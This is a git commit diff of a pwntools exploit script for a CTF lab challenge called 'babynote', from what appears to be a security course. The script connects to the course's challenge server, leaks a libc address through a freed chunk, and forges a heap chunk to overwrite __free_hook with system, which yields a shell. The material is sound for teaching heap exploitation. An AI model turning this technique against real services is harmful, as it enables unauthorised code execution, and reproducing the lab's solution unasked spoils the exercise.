1309437cb717dde61f11a44ff7f48dde0196082c
hsuck <xmjj726716@gmail.com>
2022-11-20 19:46:42 +0800

    upload exp

--- [0x08] Pwn II/[LAB] babynote/exp.py
+++ [0x08] Pwn II/[LAB] babynote/exp.py
@@ -1,20 +1,18 @@
 from pwn import *
 
-# context.log_level = 'debug'
+context.log_level = 'debug'
 context.arch = 'amd64'
 
-def add( idx, username, password ):
-    p.recvuntil("> ")
+def add( idx, name ):
+    p.recvuntil('> ')
     p.sendline('1')
     p.recvuntil("index\n> ")
     p.sendline( str( idx ) )
-    p.recvuntil("username\n> ")
-    p.sendline( username )
-    p.recvuntil("password\n> ")
-    p.sendline( password )
+    p.recvuntil("note name\n> ")
+    p.sendline( name )
 
 def edit( idx, size, data ):
-    p.recvuntil("> ")
+    p.recvuntil('> ')
     p.sendline('2')
     p.recvuntil("index\n> ")
     p.sendline( str( idx ) )
@@ -22,51 +20,45 @@ def edit( idx, size, data ):
     p.sendline( str( size ) )
     p.sendline( data )
 
-
 def delete( idx ):
-    p.recvuntil("> ")
+    p.recvuntil('> ')
     p.sendline('3')
     p.recvuntil("index\n> ")
     p.sendline( str( idx ) )
 
 def show():
-    p.recvuntil("> ")
+    p.recvuntil('> ')
     p.sendline('4')
 
-p = remote( 'edu-ctf.zoolab.org', 10008 )
-# p = process('./chal')
+p = remote( 'edu-ctf.zoolab.org', 10007 )
 
-add( 1, 'A' * 8, 'A' * 8 )
-edit( 1, 0x418, 'A' )
+add( 0, b'A' * 8 )
+edit( 0, 0x418, b'A' )
 
-add( 2, 'B' * 8, 'B' * 8 )
-edit( 2, 0x18, 'B' )
+add( 1, b'B' * 8 )
+edit( 1, 0x18, b'B' )
 
-add( 3, 'C' * 8, 'C' * 8 )
+add( 2, b'C' * 8 )
 
-delete(1)
+delete( 0 )
 show()
 
 p.recvuntil('data: ')
 libc = u64( p.recv(6).ljust( 8, b'\x00' ) ) - 0x1ecbe0
-info( f"libc: {hex(libc)}" )
-
 free_hook = libc + 0x1eee48
 system = libc + 0x52290
+info( f'libc: {hex(libc)}' )
 
 fake_chunk = flat(
     0, 0x21,
     b'CCCCCCCC', b'CCCCCCCC',
-    b'CCCCCCCC', b'CCCCCCCC',
     free_hook,
 )
 
-data = b'/bin/sh\x00'.ljust( 0x10, b'B' )
-edit( 2, 0x48, data + fake_chunk )
-edit( 3, 0x8, p64( system ) )
+data = b"/bin/sh\x00".ljust( 0x10, b'B' )
+edit( 1, 0x38, data + fake_chunk )
+edit( 2, 0x8, p64( system ) )
 
-delete( 2 )
+delete( 1 )
 
-# gdb.attach(p)
-# p.recvall()
 p.interactive()
